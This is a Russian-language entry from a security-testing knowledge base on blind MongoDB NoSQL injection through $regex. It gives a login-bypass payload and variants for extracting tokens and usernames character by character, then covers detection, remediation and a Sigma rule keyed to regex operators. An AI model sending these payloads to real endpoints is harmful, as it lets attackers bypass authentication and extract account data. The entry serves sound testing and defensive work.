---
id: nosql-mongodb-regex-blind
title: "MongoDB: слепое извлечение через $regex"
type: nosql
target: mongodb
category: web
difficulty: advanced
bypass: none
tags: [nosql, mongodb, blind, regex]
tested_on: ["MongoDB 6.0"]
success_rate: 0.65
risk: high
cwe: "CWE-943"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/NoSQL_Injection"
graph:
  - target: "nosql"
    type: instance_of
  - target: "data-exfiltration"
    type: leads_to
  - target: "bruteforce"
    type: related_to
---

# MongoDB: слепое извлечение через $regex

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
{"email": {"$regex": "^a.*"}, "password": {"$ne": null}}
```

## Explanation

Когда приложение отвечает по-разному на «пользователь найден» и «не найден»,
оператор `$regex` превращается в oracle для посимвольного чтения полей:
`^a` -> `^ad` -> `^adm` -> `^admi` -> `^admin`. Каждый шаг — один запрос,
в отличие от SQL-подобного blind, где нужен бинарный поиск по ASCII.
Ограничение: `$regex` не работает с зашифрованными/хешированными полями
и может быть запрещён политикой (`$where`/regex-лимиты в Atlas).

## Detection

Проверьте, меняется ли ответ на `{"$regex": "^a"}` против `{"$regex": "^zzz"}`.
В логах MongoDB ищите фильтры с `$regex` от учётки приложения и аномальное
число коротких запросов к одной коллекции.

## Remediation

- Валидация типа значения (только строка) — закрывает весь класс.
- Rate limiting на эндпоинты аутентификации и поиска.
- Единый ответ для «не найдено» и «неверный пароль».
- Запрет regex-операторов в пользовательских фильтрах; при необходимости —
  префиксный поиск через индекс с экранированием метасимволов.

## Variants

```
{"token": {"$regex": "^[0-9a-f]{4}"}}
```

```
{"username": {"$options": "i", "$regex": "^ADMIN"}}
```

## Detection rules

```yaml
title: Слепой NoSQL-перебор — $regex с префиксами в форме входа
id: e5f6a7b8-0075-4e5f-9a7b-000000000075
status: experimental
description: >-
  Серия запросов с {"email": {"$regex": "^a..."}} — посимвольный перебор
  значений по regexp-ответам. Признак: $regex в аутентификационных запросах
  и рост префикса от запроса к запросу.
references:
  - https://attack.mitre.org/techniques/T1190/
logsource:
  category: application
  definition: 'логи приложения с телом запроса (аутентификация и поиск)'
detection:
  selection:
    request_body|contains:
      - '$regex'
      - '$regularExpression'
      - '$options'
  condition: selection
fields:
  - source_ip
  - request_path
  - event_action
  - request_body
falsepositives:
  - поисковые API, легитимно передающие regex от клиента (ограничивайте правило
    эндпоинтами входа)
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.943
```
